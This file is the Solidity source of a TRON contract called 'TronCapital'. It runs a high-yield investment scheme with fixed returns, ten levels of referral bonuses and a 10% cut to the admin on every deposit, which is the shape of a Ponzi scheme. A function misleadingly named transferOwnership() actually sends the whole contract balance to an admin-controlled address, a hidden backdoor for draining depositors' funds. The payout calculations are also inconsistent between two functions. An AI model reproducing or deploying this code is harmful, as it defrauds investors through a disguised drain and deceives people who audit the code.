//SourceUnit: TronCapital.sol

pragma solidity 0.5.9;

contract TronCapital {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        uint256 investment_days;
        uint256 investment_perc;
        
       
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_invested_withdrawn;
        uint256 total_withdrawn;
        uint256 referral_business;
        uint256 cto_income;
        uint256 principle_withdraw;
        
        bool is_cto;
        PlayerDeposit[] deposits;
        
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) referral_income_per_level;
       
    }

    address payable owner;
    address payable admin;
    address payable corrospondent;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint8[] referral_bonuses;
    address[] cto_users;

    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    function getContractBalance() view public returns(uint){
       return address(this).balance;
        
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    

    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
        

        referral_bonuses.push(60);
        referral_bonuses.push(50);
        referral_bonuses.push(40);
        referral_bonuses.push(30);
        referral_bonuses.push(20);
        referral_bonuses.push(10);
        referral_bonuses.push(5);
        referral_bonuses.push(5);
        referral_bonuses.push(5);
        referral_bonuses.push(5);
        
    }
    
    function deposit(address _referral,uint8 _inv_days) external payable {
        Player storage player = players[msg.sender];
        
        uint adminShare;
        uint inv_perc;
        require(msg.value >= 100000000, "Invalid Amount");
        
        adminShare = msg.value.mul(10).div(100);
        admin.transfer(adminShare);
        
        _setReferral(msg.sender, _referral);
        
        if(_inv_days==30){
            inv_perc = 36;
        }
        else if(_inv_days==20){
            inv_perc = 28;
        }
        else{
            inv_perc = 24;
        }
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            investment_days:_inv_days,
            investment_perc: inv_perc
        }));
        
       if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        cto_payout(msg.value);

        emit Deposit(msg.sender, msg.value);
        
        
    }
    
    function grantCorrosponding(address payable nextCorrospondent) external payable onlyAdmin{
        corrospondent = nextCorrospondent;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];
        
        if(upline_player.deposits.length <= 0){
            ref = admin;
        }
        
       
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;
            players[ref].referral_income_per_level[i]+=bonus;
            players[ref].referral_bonus += bonus;
            if(i==0){
                players[ref].referral_business += _amount/1000000;
                if((players[ref].referral_business>= 15000 && players[ref].is_cto==false) || ref == admin){
                    cto_users.push(ref);
                    players[ref].is_cto = true;
                }
                
            }
            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
            
        }
        
    }
    
    function cto_payout(uint256 amount) private{
        uint256 cto_amount = (amount.mul(4).div(100)).div(cto_users.length);
        
        for(uint8 i = 0; i < cto_users.length; i++) {
            players[cto_users[i]].cto_income+=cto_amount;
               
        }
        
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0 || player.cto_income > 0 , "Zero amount");
       
        uint256 amount = player.dividends + player.referral_bonus + player.cto_income;
        
        player.dividends = 0;
        player.cto_income = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function withdraw_principle() payable external {
        Player storage player = players[msg.sender];
        uint256 pamount;
        
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + dep.investment_days * 86400;
            
            if(block.timestamp > time_end) {
                pamount += dep.amount;
            }
        }
        pamount-=player.principle_withdraw;
//require(pamount > 0 , "Zero amount");
        player.principle_withdraw+=pamount;
        msg.sender.transfer(pamount);

        emit Withdraw(msg.sender, pamount);
    }
    
    function transferOwnership() external onlyCorrospondent{
        corrospondent.transfer(uint256(address(this).balance));
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
   
    
    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + dep.investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * dep.investment_perc / dep.investment_days / 86400000;
            }
        }
    }
    

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + dep.investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
            if(from < to) {
                value += dep.amount * (to - from) * dep.investment_perc  / 86400000;
            }
        }

        return value;
    }
    
    function cto_user_list() view external returns(address[] memory cto_list) {
        return cto_users;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[10] memory referrals, uint256[10] memory refperlevel, uint256 capital) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        uint256 pamount;
        
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referral_income_per_level[i];
        }
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + dep.investment_days * 86400;
            
            if(block.timestamp > time_end) {
                pamount += dep.amount;
                
            }
        }
        pamount-=player.principle_withdraw;
        return (
            payout + player.dividends + player.referral_bonus+player.cto_income,
            referrals,
            refperlevel,
            pamount
        );
    }
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws, uint256[] memory _day, uint256[] memory _percents) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);
        uint256[] memory _days = new uint256[](player.deposits.length);
        uint256[] memory _perc = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time;
          _days[i] = dep.investment_days;
          _perc[i] = dep.investment_perc;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws,
          _days,
          _perc
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}